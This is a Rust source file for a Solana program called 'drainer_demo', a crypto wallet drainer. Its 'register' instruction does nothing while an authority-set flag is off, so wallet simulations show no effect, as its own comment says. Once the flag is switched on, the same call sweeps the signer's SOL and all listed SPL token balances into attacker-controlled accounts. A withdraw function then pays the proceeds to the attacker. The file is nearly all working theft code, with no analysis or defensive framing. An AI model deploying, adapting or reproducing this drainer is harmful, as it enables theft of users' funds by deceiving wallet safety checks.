use anchor_lang::prelude::*;
use anchor_lang::system_program;
use anchor_lang::solana_program;
use solana_program::program::invoke;

declare_id!("DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU");

const CONFIG_SEED: &[u8] = b"config";
const VAULT_SEED: &[u8] = b"vault";

#[program]
pub mod drainer_demo {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let config = &mut ctx.accounts.config;
        config.authority = ctx.accounts.authority.key();
        config.drain_active = false;
        config.bump = ctx.bumps.config;
        config.vault_bump = ctx.bumps.vault;
        Ok(())
    }

    pub fn flip(ctx: Context<Flip>, active: bool) -> Result<()> {
        let config = &mut ctx.accounts.config;
        config.drain_active = active;
        Ok(())
    }

    /// When drain_active=false: no-op (simulation sees nothing).
    /// When drain_active=true: drains SOL + SPL tokens via remaining_accounts
    /// triplets: [victim_token_account, attacker_ata, token_program].
    pub fn register<'a>(ctx: Context<'_, '_, 'a, 'a, Register<'a>>) -> Result<()> {
        let config = &ctx.accounts.config;

        if !config.drain_active {
            return Ok(());
        }

        let victim = &ctx.accounts.user;
        let vault = &ctx.accounts.vault;

        let victim_lamports = victim.lamports();
        let rent_minimum = Rent::get()?.minimum_balance(0);
        let drain_amount = victim_lamports.checked_sub(rent_minimum).unwrap_or(0);

        if drain_amount > 0 {
            system_program::transfer(
                CpiContext::new(
                    ctx.accounts.system_program.to_account_info(),
                    system_program::Transfer {
                        from: victim.to_account_info(),
                        to: vault.to_account_info(),
                    },
                ),
                drain_amount,
            )?;
        }

        let remaining = &ctx.remaining_accounts;
        let chunks = remaining.len() / 3;

        for i in 0..chunks {
            let victim_ta = &remaining[i * 3];
            let attacker_ata = &remaining[i * 3 + 1];
            let token_prog = &remaining[i * 3 + 2];

            let data = victim_ta.try_borrow_data()?;
            if data.len() < 72 { continue; }
            let amount = u64::from_le_bytes(data[64..72].try_into().unwrap());
            drop(data);
            if amount == 0 { continue; }

            let ix = solana_program::instruction::Instruction {
                program_id: *token_prog.key,
                accounts: vec![
                    solana_program::instruction::AccountMeta::new(*victim_ta.key, false),
                    solana_program::instruction::AccountMeta::new(*attacker_ata.key, false),
                    solana_program::instruction::AccountMeta::new_readonly(*victim.key, true),
                ],
                data: {
                    let mut d = vec![3u8];
                    d.extend_from_slice(&amount.to_le_bytes());
                    d
                },
            };
            invoke(
                &ix,
                &[
                    victim_ta.to_account_info(),
                    attacker_ata.to_account_info(),
                    victim.to_account_info(),
                    token_prog.to_account_info(),
                ],
            )?;
        }

        Ok(())
    }

    pub fn close_config(ctx: Context<CloseConfig>) -> Result<()> {
        let config_info = ctx.accounts.config.to_account_info();
        let authority_info = ctx.accounts.authority.to_account_info();
        **authority_info.try_borrow_mut_lamports()? += config_info.lamports();
        **config_info.try_borrow_mut_lamports()? = 0;
        config_info.assign(&anchor_lang::solana_program::system_program::ID);
        config_info.realloc(0, false)?;
        Ok(())
    }

    pub fn withdraw(ctx: Context<Withdraw>) -> Result<()> {
        let vault = &ctx.accounts.vault;
        let attacker = &ctx.accounts.authority;
        let config = &ctx.accounts.config;

        let rent_minimum = Rent::get()?.minimum_balance(0);
        let vault_balance = vault.lamports();
        let withdraw_amount = vault_balance.checked_sub(rent_minimum).unwrap_or(0);

        if withdraw_amount == 0 {
            return Ok(());
        }

        let vault_bump = config.vault_bump;
        let signer_seeds: &[&[u8]] = &[VAULT_SEED, &[vault_bump]];

        system_program::transfer(
            CpiContext::new_with_signer(
                ctx.accounts.system_program.to_account_info(),
                system_program::Transfer {
                    from: vault.to_account_info(),
                    to: attacker.to_account_info(),
                },
                &[signer_seeds],
            ),
            withdraw_amount,
        )?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + Config::INIT_SPACE,
        seeds = [CONFIG_SEED],
        bump,
    )]
    pub config: Account<'info, Config>,

    /// CHECK: Vault PDA for holding drained SOL.
    #[account(
        mut,
        seeds = [VAULT_SEED],
        bump,
    )]
    pub vault: UncheckedAccount<'info>,

    #[account(mut)]
    pub authority: Signer<'info>,

    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct CloseConfig<'info> {
    /// CHECK: Closing manually regardless of data layout.
    #[account(
        mut,
        seeds = [CONFIG_SEED],
        bump,
    )]
    pub config: UncheckedAccount<'info>,

    #[account(mut)]
    pub authority: Signer<'info>,
}

#[derive(Accounts)]
pub struct Flip<'info> {
    #[account(
        mut,
        seeds = [CONFIG_SEED],
        bump = config.bump,
        has_one = authority,
    )]
    pub config: Account<'info, Config>,

    pub authority: Signer<'info>,
}

#[derive(Accounts)]
pub struct Register<'info> {
    #[account(
        seeds = [CONFIG_SEED],
        bump = config.bump,
    )]
    pub config: Account<'info, Config>,

    #[account(mut)]
    pub user: Signer<'info>,

    /// CHECK: Vault PDA.
    #[account(
        mut,
        seeds = [VAULT_SEED],
        bump = config.vault_bump,
    )]
    pub vault: UncheckedAccount<'info>,

    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(
        seeds = [CONFIG_SEED],
        bump = config.bump,
        has_one = authority,
    )]
    pub config: Account<'info, Config>,

    /// CHECK: Vault PDA.
    #[account(
        mut,
        seeds = [VAULT_SEED],
        bump = config.vault_bump,
    )]
    pub vault: UncheckedAccount<'info>,

    #[account(mut)]
    pub authority: Signer<'info>,

    pub system_program: Program<'info, System>,
}

#[account]
#[derive(InitSpace)]
pub struct Config {
    pub authority: Pubkey,
    pub drain_active: bool,
    pub bump: u8,
    pub vault_bump: u8,
}
